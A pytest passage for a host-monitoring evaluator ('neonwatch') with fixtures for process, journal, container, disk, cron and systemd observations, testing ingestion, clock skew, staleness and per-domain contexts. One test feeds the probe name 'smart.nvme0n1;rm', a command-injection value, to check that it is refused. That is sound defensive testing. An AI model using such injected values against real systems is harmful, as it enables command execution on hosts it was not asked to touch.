"""The evaluator: real rules, a scripted judge and a scripted correlator.

Observations are shaped as `docs/probes.md` says each parser emits them. The fake judge is an
object with an async `attest` that answers from a script keyed by context entity; the fake
correlator records the candidates it is handed and answers with scripted links.
"""

from __future__ import annotations

import copy
import dataclasses
import hashlib
import json
from collections.abc import Callable, Sequence
from typing import Any

import pytest

from neonwatch import correlator as corr
from neonwatch import evaluator as ev
from neonwatch import jobs, rules
from neonwatch.config import Cadence, Config
from neonwatch.evaluator import Collation, Evaluator, EvaluatorError, percolate, rank
from neonwatch.probes import CATALOG
from neonwatch.questions import DOMAINS, ENTITIES, ContextKind, bank_for, needs_present
from neonwatch.schema import (
    Attestation,
    Context,
    Event,
    Finding,
    Heartbeat,
    Issue,
    IssueState,
    Kind,
    Link,
    Observation,
    SchemaError,
    Severity,
    decode_event,
    encode_event,
    to_body,
)

T0 = 1_790_000_000.0
CONFIG = Config()
INFO, WATCH, WARN, CRITICAL = Severity.INFO, Severity.WATCH, Severity.WARN, Severity.CRITICAL
OPEN, RESOLVED = IssueState.OPEN, IssueState.RESOLVED


# --- observations, shaped as docs/probes.md -----------------------------------------------------


def proc(pid: int, comm: str, cpu_pct: float = 1.0, rss_kb: int = 50_000, cpu_s: int = 100,
         elapsed_s: int = 10_000, args: str = "", user: str = "alice",
         pid_ns: str | None = "host") -> dict[str, Any]:
    return {"pid": pid, "ppid": 1, "user": user, "state": "S", "cpu_pct": cpu_pct,
            "rss_kb": rss_kb, "elapsed_s": elapsed_s, "threads": 4, "cpu_s": cpu_s,
            "comm": comm, "args": args or f"/usr/bin/{comm} --serve", "pid_ns": pid_ns}


def processes(*extra: dict[str, Any], from_tmp: Sequence[dict[str, Any]] = ()) -> dict[str, Any]:
    rows = [proc(100 + n, f"worker{n}", cpu_pct=float(n)) for n in range(20)] + list(extra)
    by_cpu = sorted(rows, key=lambda r: (-r["cpu_pct"], r["pid"]))[:20]
    by_rss = sorted(rows, key=lambda r: (-r["rss_kb"], r["pid"]))[:20]
    return {"count": 412, "threads": 2100, "rss_kb_total": 18_000_000, "cpu_pct_total": 180.5,
            "zombies": 0, "uninterruptible": 0, "top_cpu": by_cpu, "top_rss": by_rss,
            "from_tmp": list(from_tmp), "redacted": 0}


def entry(unit: str, message: str, priority: int = 4, identifier: str = "",
          at: float = T0 - 30) -> dict[str, Any]:
    return {"at": at, "unit": unit, "identifier": identifier or unit.removesuffix(".service"),
            "transport": "syslog", "priority": priority, "message": message}


def journal(by_unit: dict[str, int], cap: int, entries: Sequence[dict[str, Any]] = ()
            ) -> dict[str, Any]:
    count = sum(by_unit.values())
    return {"entries": list(entries), "count": count, "kept": len(entries),
            "capped": count >= cap, "by_unit": dict(by_unit), "by_priority": {"4": count},
            "redacted": 0}


def container(name: str, state: str = "running", health: str = "", exit_code: Any = None,
              status: str = "Up 3 hours", published: Sequence[dict[str, Any]] = (),
              network_mode: str = "bridge", host_mounts: Sequence[str] = ()) -> dict[str, Any]:
    return {"id": "0123456789ab", "name": name, "image": f"{name.rsplit('-', 1)[0]}:latest",
            "state": state, "status": status, "health": health, "exit_code": exit_code,
            "created": 1_789_990_000, "compose_project": "shopfront",
            "published": list(published), "network_mode": network_mode,
            "host_mounts": list(host_mounts)}


def port(number: int, ip: str = "0.0.0.0", proto: str = "tcp") -> dict[str, Any]:
    return {"ip": ip, "port": number, "container_port": number, "proto": proto}


def containers(*rows: dict[str, Any]) -> dict[str, Any]:
    by_state: dict[str, int] = {}
    for row in rows:
        by_state[row["state"]] = by_state.get(row["state"], 0) + 1
    return {"containers": list(rows), "count": len(rows), "by_state": by_state}


def listener(proto: str, address: str, port: int, process: str = "", pid: int | None = None,
             wildcard: bool = False) -> dict[str, Any]:
    return {"proto": proto, "state": "LISTEN" if proto == "tcp" else "UNCONN",
            "address": address, "interface": "", "port": port, "process": process, "pid": pid,
            "wildcard": wildcard, "loopback": address.startswith("127.")}


def listeners(*rows: dict[str, Any]) -> dict[str, Any]:
    return {"listeners": list(rows), "count": len(rows),
            "wildcard_count": sum(r["wildcard"] for r in rows)}


def iface(name: str, rx: int = 1000) -> dict[str, Any]:
    counters = {f"rx_{k}": 0 for k in ("packets", "errs", "drop", "fifo", "frame", "compressed",
                                       "multicast")}
    counters.update({f"tx_{k}": 0 for k in ("bytes", "packets", "errs", "drop", "fifo", "colls",
                                            "carrier", "compressed")})
    return {"name": name, "rx_bytes": rx, **counters}


def netdev(*names: str, rx: int = 1000) -> dict[str, Any]:
    return {"interfaces": [iface(n, rx) for n in names], "count": len(names)}


def smart(device: str = "nvme0n1", **fields: Any) -> dict[str, Any]:
    base = {"device": f"/dev/{device}", "type": "nvme", "protocol": "NVMe",
            "model": "Samsung SSD 980 PRO 2TB", "serial": "S7KHNJ0W", "firmware": "5B2QGXA7",
            "exit_status": 0, "passed": True, "temperature_c": 41, "power_on_hours": 5120,
            "power_cycles": 310, "critical_warning": 0, "available_spare_pct": 100,
            "available_spare_threshold_pct": 10, "percentage_used": 3, "media_errors": 0,
            "error_log_entries": 12, "unsafe_shutdowns": 21, "reallocated_sectors": None,
            "reported_uncorrect": None, "pending_sectors": None, "offline_uncorrectable": None,
            "udma_crc_errors": None, "failing_attributes": []}
    return {**base, **fields}


def gpu(index: int = 0, temperature_c: int = 55, pcie_width: int = 16) -> dict[str, Any]:
    return {"index": index, "name": "NVIDIA GeForce RTX 4090",
            "temperature_c": temperature_c, "power_w": 61.2, "power_limit_w": 300.0,
            "memory_used_mib": 1200, "memory_total_mib": 49140, "utilization_pct": 3,
            "throttle_reasons": 1, "throttle": ["gpu_idle"], "pcie_width": pcie_width,
            "pcie_width_max": 16}


def crontab(path: str, *entries: tuple[str, str, str]) -> dict[str, Any]:
    """A cron.system / cron.d / cron.user observation of one file, as the parsers emit it."""
    listed = [{"file": path, "user": user, "schedule": schedule, "command": command,
               "stdin": False} for user, schedule, command in entries]
    return {"files": [{"path": path, "env": {}, "entries": len(listed), "skipped": 0}],
            "entries": listed, "count": len(listed), "skipped": 0, "redacted": 0}


def cron_id(path: str, user: str, schedule: str, command: str) -> str:
    """A cron job's id, as the PLAN contract defines it."""
    return "cron:" + hashlib.sha256(f"{path}\n{user}\n{schedule}\n{command}".encode()
                                    ).hexdigest()[:32]


def unit(id: str, **fields: Any) -> dict[str, Any]:
    """One `units.detail` unit, every field the parser emits, empty unless given."""
    return {"id": id, "description": "", "user": "", "exec": [], "active": "", "sub": "",
            "result": "", "restarts": None, "main_status": None, "started": None,
            "exited": None, "enabled": "", "file": "", "triggers": [], "triggered_by": [],
            "calendar": [], "unit": ""} | fields


def timed(name: str, command: str, result: str = "success") -> list[dict[str, Any]]:
    """A timer and the service it activates."""
    return [unit(f"{name}.timer", active="active", sub="waiting", result="success",
                 enabled="enabled", file=f"/usr/lib/systemd/system/{name}.timer",
                 triggers=[f"{name}.service"], calendar=["*-*-* 06,18:00:00"],
                 unit=f"{name}.service"),
            unit(f"{name}.service", exec=[command], active="inactive", sub="dead",
                 result=result, restarts=0, main_status=0, enabled="static",
                 file=f"/usr/lib/systemd/system/{name}.service",
                 triggered_by=[f"{name}.timer"])]


def sshd(restarts: int = 0) -> dict[str, Any]:
    return unit("ssh.service", exec=["/usr/sbin/sshd -D"], active="active", sub="running",
                result="success", restarts=restarts, main_status=0, enabled="enabled",
                file="/usr/lib/systemd/system/ssh.service")


def detail(*units: dict[str, Any]) -> dict[str, Any]:
    return {"units": sorted(units, key=lambda u: u["id"]), "count": len(units), "skipped": 0,
            "redacted": 0}


APT = "/usr/lib/apt/apt.systemd.daily update"
HOURLY = "cd / && run-parts --report /etc/cron.hourly"
SPOOL = "/var/spool/cron/crontabs/alice"
BACKUP = ("alice", "0 2 * * *", "/usr/bin/rsync -a /home/alice/src /mnt/backup")
E2SCRUB = ("root", "30 3 * * 0", "/usr/libexec/e2fsprogs/e2scrub_all_cron")


def host() -> dict[str, dict[str, Any]]:
    """One healthy observation of every probe on a workstation like this one."""
    return {
        "load": {"load1": 1.2, "load5": 1.1, "load15": 0.9, "runnable": 2, "threads": 2100,
                 "last_pid": 99_000},
        "uptime": {"uptime_s": 190_000.0, "idle_s": 5_000_000.0},
        "psi.cpu": {"some_avg10": 1.0, "some_avg60": 0.8, "some_avg300": 0.5,
                    "some_total_us": 1_000_000, "full_avg10": 0.0, "full_avg60": 0.0,
                    "full_avg300": 0.0, "full_total_us": 0},
        "psi.memory": {"some_avg10": 0.0, "some_avg60": 0.0, "some_avg300": 0.0,
                       "some_total_us": 10, "full_avg10": 0.0, "full_avg60": 0.0,
                       "full_avg300": 0.0, "full_total_us": 0},
        "psi.io": {"some_avg10": 0.1, "some_avg60": 0.1, "some_avg300": 0.1,
                   "some_total_us": 99, "full_avg10": 0.0, "full_avg60": 0.0,
                   "full_avg300": 0.0, "full_total_us": 0},
        "memory": {"mem_total_kb": 131_000_000, "mem_free_kb": 60_000_000,
                   "mem_available_kb": 100_000_000, "mem_available_pct": 76.34,
                   "swap_total_kb": 8_000_000, "swap_free_kb": 8_000_000, "swap_used_pct": 0.0,
                   "hardware_corrupted_kb": 0, "buffers_kb": 900_000, "cached_kb": 30_000_000,
                   "swap_cached_kb": 0, "dirty_kb": 2000, "writeback_kb": 0,
                   "anon_pages_kb": 20_000_000, "shmem_kb": 1_500_000, "slab_kb": 4_000_000,
                   "commit_limit_kb": 73_500_000, "committed_as_kb": 40_000_000},
        "vmstat": {"oom_kill": 0, "pgfault": 10_000, "pgmajfault": 10, "pswpin": 0,
                   "pswpout": 0},
        "cpu.stat": {"user": 100_000, "nice": 0, "system": 20_000, "idle": 900_000,
                     "iowait": 1000, "irq": 0, "softirq": 500, "steal": 0, "cpus": 32,
                     "ctxt": 1_000_000, "btime": 1_789_800_000, "processes": 50_000,
                     "procs_running": 2, "procs_blocked": 0},
        "sensors": {"readings": [
            {"chip": "k10temp-pci-00c3", "adapter": "PCI adapter", "label": "Tctl",
             "sensor": "temp1", "kind": "temp", "input": 48.5, "min": None, "max": None,
             "crit": None, "alarm": None},
            {"chip": "nvme-pci-0600", "adapter": "PCI adapter", "label": "Composite",
             "sensor": "temp1", "kind": "temp", "input": 41.9, "min": -273.15, "max": 81.85,
             "crit": 84.85, "alarm": 0.0}], "count": 2},
        "gpu": {"gpus": [gpu(0)], "count": 1},
        "disk.fill": {"filesystems": [
            {"source": "/dev/nvme0n1p2", "fstype": "ext4", "mount": "/",
             "size_bytes": 1_000_000_000_000, "used_bytes": 400_000_000_000,
             "avail_bytes": 550_000_000_000, "used_pct": 42.11, "inodes": 60_000_000,
             "inodes_used": 3_000_000, "inodes_used_pct": 5.0},
            {"source": "/dev/nvme0n10p1", "fstype": "ext4", "mount": "/scratch",
             "size_bytes": 1_000_000_000, "used_bytes": 1, "avail_bytes": 999_999_999,
             "used_pct": 0.0, "inodes": 60_000, "inodes_used": 11, "inodes_used_pct": 0.02}],
            "count": 2},
        "net.dev": netdev("lo", "enp5s0", "docker0"),
        "processes": processes(),
        "units.failed": {"units": [], "count": 0},
        "journal.warnings": journal(
            {"gnome-shell": 12}, 500,
            [entry("", "Window manager warning", identifier="gnome-shell")]),
        "journal.errors": journal({}, 200),
        "listeners": listeners(listener("tcp", "0.0.0.0", 22, "sshd", 900, wildcard=True),
                               listener("tcp", "127.0.0.1", 8200, "judge", 4000)),
        "kernel.tainted": {"value": 4096, "bits": [12], "flags": "O"},
        "containers": containers(container("shopfront-web-1")),
        "edac": {"controllers": [{"mc": "mc0", "ce_count": 0, "ue_count": 0}], "ce_total": 0,
                 "ue_total": 0},
        "block.devices": {"entries": ["loop0", "nvme0n1"], "count": 2},
        "smart.nvme0n1": smart(),
        "firewall": {"hash": "ab" * 32, "version": "1.0.9", "tables": 2, "chains": 6,
                     "rules": 20, "sets": 1, "table_names": ["inet filter", "ip nat"],
                     "base_chains": [{"family": "inet", "table": "filter", "name": "input",
                                      "hook": "input", "type": "filter", "policy": "drop",
                                      "priority": 0, "rules": 8}]},
        "kernel.modules": {"modules": ["nvidia", "nvme"], "count": 2,
                           "tainting": {"nvidia": "OE"}, "not_live": []},
        "reboot.required": {"required": False, "packages": []},
        "ssh.keys.home": {"files": [{"path": "/home/alice/.ssh/authorized_keys", "keys": 1,
                                     "invalid_lines": 0, "sha256": "cd" * 32}],
                          "keys": [{"path": "/home/alice/.ssh/authorized_keys",
                                    "type": "ssh-ed25519", "fingerprint": "SHA256:abc",
                                    "comment": "alice@laptop", "options": False}], "count": 1},
        "ssh.keys.root": {"files": [], "keys": [], "count": 0},
        "cron.system": crontab("/etc/crontab", ("root", "17 * * * *", HOURLY)),
        "cron.d": crontab("/etc/cron.d/e2scrub_all", E2SCRUB),
        "cron.user": crontab(SPOOL, BACKUP),
        "cron.daily": {"scripts": [{"path": "/etc/cron.daily/dpkg", "size": 35,
                                    "truncated": False,
                                    "head": "#!/bin/sh\n/usr/libexec/dpkg/backup\n"}],
                       "count": 1, "redacted": 0},
        "units.files": {"units": {"ssh.service": "enabled"}, "count": 1,
                        "by_state": {"enabled": 1}},
        "units.timers": {"timers": [{"unit": "apt-daily.timer", "activates": "apt-daily.service",
                                     "next": T0 + 3600, "last": T0 - 3600}], "count": 1,
                         "skipped": 0},
        "units.detail": detail(*timed("apt-daily", APT), sshd()),
        "routes": {"count": 4, "default": [{"interface": "enp5s0", "gateway": "192.168.1.1",
                                            "metric": 100, "up": True}]},
        "mounts": {"mounts": [{"source": "/dev/nvme0n1p2", "target": "/", "fstype": "ext4",
                               "read_only": False, "network": False}], "count": 1},
        "boot": {"entries": ["config-6.8.0-147-generic", "vmlinuz-6.8.0-146-generic",
                             "vmlinuz-6.8.0-147-generic"], "count": 3, "links": {}},
        "kernel.release": {"release": "6.8.0-147-generic"},
        "apt.upgrades": {"upgradable": 0, "security": 0, "packages": [], "not_upgraded": 0},
    }


# --- events -------------------------------------------------------------------------------------


def obs(probe: str, data: dict[str, Any], at: float, error: str = "") -> Event:
    return Event(Kind.OBSERVATION, at, "collector", f"obs.{probe}",
                 to_body(Observation(probe, data, cpu_ms=3, error=error)))


def beat(at: float, confined: bool = True) -> Event:
    return Event(Kind.HEARTBEAT, at, "collector", "hb.agent",
                 to_body(Heartbeat(cpu_fraction=0.002, confined=confined,
                                   writable=() if confined else ("/etc",), ran=30, failed=0,
                                   deferred=0)))


# --- fakes --------------------------------------------------------------------------------------

#: (question, severity, stable) plus optional overrides.
Script = Callable[[Context], Sequence[tuple]]


def attestation(context: Context, question: str, severity: Severity, stable: bool | None = None,
                *, answer: dict[str, Any] | None = None, cause: str = "", next_step: str = "",
                confidence: float = 0.9, evidence: dict[str, Any] | None = None) -> Attestation:
    return Attestation(context=context.id, context_kind=context.kind, domain=context.domain,
                       entity=context.entity, question=question, instructions=f"ask {question}",
                       answer=answer or {"type": "noul", "noul": 0.9}, severity=severity,
                       cause=cause or f"{question}-cause",
                       next_step=next_step or ("" if severity is INFO else f"look at {question}"),
                       confidence=confidence, stable=stable, latency_ms=80,
                       evidence=evidence or {})


def urgency(level: float) -> dict[str, Any]:
    """A raw urgency score answer on the bank's 5-level scale."""
    return {"type": "score", "score": round(level), "expected": level,
            "probabilities": {str(i): 0.2 for i in range(5)}, "confidence": 0.8}


class FakeJudge:
    """Answers each context from `script[entity]` (or `default`); records what it was asked."""

    def __init__(self, script: dict[str, Sequence[tuple]] | None = None,
                 default: Sequence[tuple] = (("quiet", INFO, None),)) -> None:
        self.script = dict(script or {})
        self.default = default
        self.calls: list[tuple[Context, ...]] = []
        self.down = False

    async def attest(self, contexts: Sequence[Context]) -> tuple[Attestation, ...]:
        self.calls.append(tuple(contexts))
        if self.down:
            return ()
        out = []
        for context in contexts:
            for spec in self.script.get(context.entity, self.default):
                question, severity, stable, *rest = spec
                extra = rest[0] if rest else {}
                out.append(attestation(context, question, severity, stable, **extra))
        return tuple(out)

    @property
    def last(self) -> dict[str, Context]:
        return {c.entity: c for c in self.calls[-1]} if self.calls else {}


class FakeCorrelator:
    def __init__(self, related: bool = True) -> None:
        self.related = related
        self.calls: list[tuple[corr.Candidate, ...]] = []

    async def link(self, candidates: Sequence[corr.Candidate]) -> tuple[Link, ...]:
        self.calls.append(tuple(candidates))
        if not self.related:
            return ()
        return tuple(Link(id=corr.context_id(c), members=tuple(m.id for m in c.members),
                          basis=c.basis, related=0.91, likely_cause=c.members[0].id,
                          confidence=0.8, stable=True) for c in candidates)


class Clock:
    """Wall-clock seconds. The first reading (the evaluator's start) is `start`; after that it
    reads `now`, by default well after every event these scenarios date, and ticks 1 ms a call."""

    def __init__(self, start: float = T0, now: float = T0 + 100_000) -> None:
        self.start, self.t, self.started = start, now, False

    def __call__(self) -> float:
        if not self.started:
            self.started = True
            return self.start
        self.t += 0.001
        return self.t


def make(judge: FakeJudge | None = None, correlator: FakeCorrelator | None = None,
         started: float = T0 - 3600) -> tuple[Evaluator, FakeJudge, FakeCorrelator]:
    judge = judge or FakeJudge()
    correlator = correlator or FakeCorrelator(related=False)
    return (Evaluator(rules.evaluate, judge, correlator, CONFIG, Clock(started)), judge,
            correlator)


def feed(evaluator: Evaluator, data: dict[str, dict[str, Any]], at: float,
         heartbeat: bool = True) -> None:
    for probe, value in data.items():
        evaluator.observe(obs(probe, copy.deepcopy(value), at))
    if heartbeat:
        evaluator.observe(beat(at))


def issues_by(collation: Collation) -> dict[str, Issue]:
    return {i.entity + "|" + ("det" if i.deterministic else "judged"): i
            for i in collation.issues}


def only_issue(collation: Collation, entity: str, deterministic: bool = True) -> Issue:
    return issues_by(collation)[entity + "|" + ("det" if deterministic else "judged")]


async def run(evaluator: Evaluator, now: float) -> Collation:
    return await evaluator.collate(now)


# --- observe: strict input ----------------------------------------------------------------------


def test_observe_refuses_what_it_does_not_understand():
    e, _, _ = make()
    with pytest.raises(EvaluatorError, match="unknown probe"):
        e.observe(obs("mystery", {}, T0))
    with pytest.raises(EvaluatorError, match="unknown probe"):
        e.observe(obs("smart.nvme0n1;rm", {}, T0))
    with pytest.raises(EvaluatorError, match="subject"):
        e.observe(Event(Kind.OBSERVATION, T0, "collector", "obs.load",
                        to_body(Observation("memory", {}, 1))))
    with pytest.raises(EvaluatorError, match="observations and heartbeats"):
        e.observe(Event(Kind.FINDING, T0, "evaluator", "finding.x", {}))
    with pytest.raises(SchemaError):
        e.observe(Event(Kind.OBSERVATION, T0, "collector", "obs.load", {"probe": "load"}))


def test_an_older_or_repeated_observation_does_not_move_the_window():
    e, _, _ = make()
    e.observe(obs("load", {"load1": 2.0}, T0))
    e.observe(obs("load", {"load1": 9.0}, T0 - 60))   # out of order
    e.observe(obs("load", {"load1": 7.0}, T0))        # redelivered
    snap = e.snapshot(T0 + 1)
    assert snap.latest["load"] == (T0, {"load1": 2.0})
    assert "load" not in snap.previous
    e.observe(beat(T0))
    e.observe(beat(T0 - 60))
    assert [at for at, _ in e.snapshot(T0 + 1).heartbeats] == [T0]


def test_an_event_dated_beyond_the_allowed_skew_is_refused_and_counted():
    clock = Clock(start=T0 - 3600, now=T0)
    e = Evaluator(rules.evaluate, FakeJudge(), FakeCorrelator(), CONFIG, clock)
    e.observe(beat(T0))
    e.observe(beat(T0 + 10_000))                      # far future: would hide a dead agent
    e.observe(beat(T0 + ev.MAX_SKEW_S + 1))            # just past the skew
    assert e.refused_future == 2
    assert [at for at, _ in e.snapshot(T0).heartbeats] == [T0]
    clock.t = T0 + 300                                 # the agent has been silent 300 s
    stopped = [f for f in rules.evaluate(e.snapshot(T0 + 300), CONFIG)
               if f.rule == "agent.stopped"]
    assert len(stopped) == 1 and stopped[0].evidence["last_heartbeat_at"] == T0

    e.observe(obs("load", {"load1": 1.0}, T0 + 300))
    e.observe(obs("load", {"load1": 99.0}, T0 + 20_000))
    e.observe(obs("load", {}, T0 + 20_000, error="future error"))
    e.observe(obs("load", {"load1": 2.0}, T0 + 360))   # still accepted: never blocked
    assert e.refused_future == 4
    assert e.snapshot(T0 + 361).latest["load"] == (T0 + 360, {"load1": 2.0})
    assert e.failing() == {}


def test_an_event_within_the_skew_is_accepted():
    clock = Clock(start=T0 - 3600, now=T0)
    e = Evaluator(rules.evaluate, FakeJudge(), FakeCorrelator(), CONFIG, clock)
    e.observe(beat(T0 + ev.MAX_SKEW_S - 1))           # the agent's clock runs a little ahead
    e.observe(obs("load", {"load1": 1.0}, T0 + 60))
    assert e.refused_future == 0
    assert [at for at, _ in e.snapshot(T0).heartbeats] == [T0 + ev.MAX_SKEW_S - 1]
    assert "load" in e.snapshot(T0).latest
    assert ev.MAX_SKEW_S == 120


def test_the_window_keeps_latest_and_previous_and_a_bounded_history():
    e, _, _ = make()
    for n in range(ev.HISTORY + 3):
        e.observe(obs("load", {"load1": float(n)}, T0 + 60 * n))
    snap = e.snapshot(T0 + 60 * (ev.HISTORY + 3))
    assert snap.latest["load"][1] == {"load1": float(ev.HISTORY + 2)}
    assert snap.previous["load"][1] == {"load1": float(ev.HISTORY + 1)}
    assert len(e.history("load")) == ev.HISTORY
    for n in range(ev.HEARTBEATS + 2):
        e.observe(beat(T0 + n))
    assert len(e.snapshot(T0 + 100).heartbeats) == ev.HEARTBEATS


# --- errored observations and staleness --------------------------------------------------------


def test_an_errored_observation_never_replaces_the_latest_good_value():
    e, _, _ = make()
    e.observe(obs("load", {"load1": 1.5}, T0))
    e.observe(obs("load", {}, T0 + 60, error="read failed: EIO"))
    e.observe(obs("load", {}, T0 + 120, error="read failed: EIO"))
    snap = e.snapshot(T0 + 130)
    assert snap.latest["load"] == (T0, {"load1": 1.5})
    assert e.failing() == {"load": (T0 + 120, "read failed: EIO")}


def test_a_probe_that_keeps_failing_goes_stale_and_its_domain_says_so():
    e, _, _ = make()
    e.observe(obs("load", {"load1": 1.5}, T0))
    for n in range(1, 5):
        e.observe(obs("load", {}, T0 + 60 * n, error="read failed: EIO"))
    e.observe(beat(T0 + 240))
    stale = [f for f in rules.evaluate(e.snapshot(T0 + 241), CONFIG) if f.rule == "probe.stale"
             and f.entity == "probe:load"]
    assert len(stale) == 1 and stale[0].evidence["last_at"] == T0
    cpu = {c.id: c for c in e.contexts(T0 + 241)}["cpu"]
    assert cpu.state["unavailable"] == {"load": "read failed: EIO"}
    assert cpu.state["load"] == {"load1": 1.5}


def test_a_probe_that_recovers_is_no_longer_failing():
    e, _, _ = make()
    e.observe(obs("load", {}, T0, error="boom"))
    e.observe(obs("load", {"load1": 1.0}, T0 + 60))
    e.observe(obs("load", {}, T0 + 30, error="late, older than the good one"))
    assert e.failing() == {}


def test_a_probe_that_only_ever_errored_has_no_domain_context():
    e, _, _ = make()
    e.observe(obs("gpu", {}, T0, error="nvidia-smi: not found"))
    assert "gpu" not in {c.id for c in e.contexts(T0 + 1)}


def test_never_reported_probes_get_a_grace_period_from_the_evaluator_start():
    e, _, _ = make(started=T0)
    e.observe(beat(T0 + 100))

    def stale(now: float) -> set[str]:
        return {f.entity for f in rules.evaluate(e.snapshot(now), CONFIG)
                if f.rule == "probe.stale"}

    assert stale(T0 + 100) == set()
    fast = {f"probe:{s.id}" for s in CATALOG if s.tier.value == "fast" and not s.devices}
    e.observe(beat(T0 + 181))
    assert stale(T0 + 181) == fast
    e.observe(obs("smart.sda", {}, T0 + 181, error="smartctl: open failed"))
    assert "smart.sda" not in e.snapshot(T0 + 181).cadence
    assert "smart.sda" in e.snapshot(T0 + 3 * 3600 + 1).cadence


def test_probe_domains_and_tiers_come_from_the_catalog():
    assert not hasattr(ev, "PROBES")
    for spec in CATALOG:
        if spec.devices:
            with pytest.raises(EvaluatorError, match="unknown probe"):
                ev.place(spec.id)          # the template itself is never observed
            for name in ("nvme0n1", "sda"):
                assert ev.place(f"{spec.id}.{name}") == (spec.domain, spec.tier.value)
            with pytest.raises(EvaluatorError, match="unknown probe"):
                ev.place(f"{spec.id}.loop0")   # not a name the template admits
        else:
            assert ev.place(spec.id) == (spec.domain, spec.tier.value)


def test_cadence_comes_from_the_config():
    fast = Config(cadence=Cadence(fast=30, medium=120, slow=600, daily=3600))
    e = Evaluator(rules.evaluate, FakeJudge(), FakeCorrelator(), fast, Clock(T0 - 86400))
    e.observe(obs("load", {"load1": 1.0}, T0))
    e.observe(obs("smart.nvme0n1", smart(), T0))
    cadence = e.snapshot(T0 + 1).cadence
    assert (cadence["load"], cadence["processes"], cadence["smart.nvme0n1"],
            cadence["cron.daily"]) == (30, 120, 600, 3600)


def test_the_storage_state_leaves_out_where_sys_block_links_point():
    e, _, _ = make()
    listing = {"entries": ["nvme0n1"], "count": 1,
               "links": {"nvme0n1": "../devices/pci0000:00/0000:00:01.1/nvme/nvme0/nvme0n1"}}
    feed(e, {"block.devices": listing}, T0)
    state = next(c for c in e.contexts(T0 + 1) if c.id == "storage").state
    assert state["block.devices"] == {"entries": ["nvme0n1"], "count": 1}


def test_a_disk_block_devices_no_longer_lists_is_not_held_to_its_cadence():
    e, _, _ = make(started=T0 - 86400)
    e.observe(obs("smart.sdb", smart("sdb"), T0))
    e.observe(obs("smart.sdc", {}, T0, error="smartctl: open failed"))
    assert {"smart.sdb", "smart.sdc"} <= set(e.snapshot(T0 + 1).cadence)   # no listing yet
    e.observe(obs("block.devices", {"entries": ["loop0", "nvme0n1", "sdc"], "count": 3},
                  T0 + 10))
    later = T0 + 4 * 3600
    e.observe(beat(later))
    cadence = e.snapshot(later).cadence
    assert "smart.sdb" not in cadence and "smart.sdc" in cadence
    stale = {f.entity for f in rules.evaluate(e.snapshot(later), CONFIG)
             if f.rule == "probe.stale"}
    assert "probe:smart.sdb" not in stale and "probe:smart.sdc" in stale
    e.observe(obs("block.devices", {"entries": ["nvme0n1", "sdb", "sdc"], "count": 3},
                  later + 1))
    assert "smart.sdb" in e.snapshot(later + 2).cadence   # plugged back in


@pytest.mark.asyncio
async def test_a_removed_disk_leaves_the_contexts_and_its_issue_resolves():
    judge = FakeJudge({"disk:/dev/sdb": [("failing", WARN, True)]})
    e, _, _ = make(judge)
    listed = {"entries": ["nvme0n1", "sdb"], "count": 2}
    feed(e, {"block.devices": listed, "smart.nvme0n1": smart(),
             "smart.sdb": smart("sdb", serial="WD-1", critical_warning=1)}, T0)
    first = await run(e, T0 + 1)
    critical = only_issue(first, "disk:/dev/sdb")   # deterministic: smart.critical_warning
    assert critical.reasons[0] == "smart.critical_warning"
    id = critical.id

    def disks(now: float) -> tuple[set[str], set[str]]:
        """Every current context (asked or not): disk entities, and the storage SMART keys."""
        built = {c.entity: c for c in e._build(e.snapshot(now))}
        return ({entity for entity, c in built.items() if c.kind == "disk"},
                {k for k in built["domain:storage"].state if k.startswith("smart.")})

    gone = {"entries": ["nvme0n1"], "count": 1}
    states = []
    for n in range(1, ev.RESOLVE_AFTER + 1):
        feed(e, {"block.devices": gone}, T0 + 300 * n)
        assert disks(T0 + 300 * n + 1) == ({"disk:/dev/nvme0n1"}, {"smart.nvme0n1"})
        assert "smart.sdb" not in e.snapshot(T0 + 300 * n + 1).latest   # rules stop seeing it
        collation = await run(e, T0 + 300 * n + 1)
        assert not [f for f in collation.findings if f.entity == "disk:/dev/sdb"]
        states.append({i.id: i.state for i in collation.issues}[id])
    assert states == [OPEN] * (ev.RESOLVE_AFTER - 1) + [RESOLVED]
    feed(e, {"block.devices": listed}, T0 + 3000)   # plugged back in: held again
    assert disks(T0 + 3001) == ({"disk:/dev/nvme0n1", "disk:/dev/sdb"},
                                {"smart.nvme0n1", "smart.sdb"})


def test_a_reported_probe_is_held_to_its_cadence_from_the_start():
    e, _, _ = make(started=T0)
    e.observe(obs("processes", processes(), T0))
    snap = e.snapshot(T0 + 1)
    assert snap.cadence == {"processes": CONFIG.cadence.medium}


# --- contexts: domains ---------------------------------------------------------------------------


def test_one_context_per_domain_with_data_each_compact():
    e, _, _ = make()
    feed(e, host(), T0)
    got = {c.id: c for c in e.contexts(T0 + 1)}
    domains = {c.id: c for c in got.values() if ContextKind(c.kind) in DOMAINS}
    assert set(domains) == {k.value for k in DOMAINS}
    for id, context in domains.items():
        assert (context.kind, context.domain, context.entity) == (id, id, f"domain:{id}")
    procs = domains["processes"].state["processes"]
    assert len(procs["top_cpu"]) == ev.TOP_N < 20 and len(procs["top_rss"]) == ev.TOP_N
    assert procs["count"] == 412 and procs["cpu_pct_total"] == 180.5
    assert set(procs["top_cpu"][0]) >= {"pid", "user", "cpu_pct", "rss_kb", "comm", "args",
                                        "pid_ns"}
    logs = domains["logs"].state
    assert set(logs) == {"journal.warnings", "journal.errors"}
    assert logs["journal.warnings"]["top_sources"] == {"gnome-shell": 12}
    assert logs["journal.warnings"]["recent"] == [
        {"source": "gnome-shell", "priority": 4, "message": "Window manager warning"}]
    assert "running" in domains["containers"].state["containers"]["by_state"]
    assert "status" not in domains["containers"].state["containers"]["containers"][0]
    assert domains["storage"].state["smart.nvme0n1"]["model"] == "Samsung SSD 980 PRO 2TB"
    assert "reallocated_sectors" not in domains["storage"].state["smart.nvme0n1"]  # nulls go
    assert domains["network"].state["listeners"]["wildcard"] == [
        {"proto": "tcp", "address": "0.0.0.0", "port": 22, "process": "sshd"}]
    assert domains["security"].state["agent"] == {"confined": True,
                                                  "mounts_this_agent_can_write": [],
                                                  "failed": 0, "deferred": 0}
    assert domains["kernel"].state["uptime"] == {"uptime_days": 2.2, "rebooted": False}
    # The job probes are joined, never carried raw; without a baseline there is no diff yet.
    assert not jobs.PROBES & (set(domains["security"].state) | set(domains["services"].state))
    assert domains["security"].state["jobs"] == {
        "count": 5, "skipped": 0, "by_source": {"cron": 3, "cron-periodic": 1, "timer": 1}}
    assert domains["services"].state["services"] == {
        "count": 2, "by_active": {"active": 1, "inactive": 1}, "failed": [], "restarted": [],
        "timers": {"count": 1},
        "key_units": {"ssh.service": {"active": "active", "sub": "running", "enabled": "enabled"}}}
    for context in got.values():
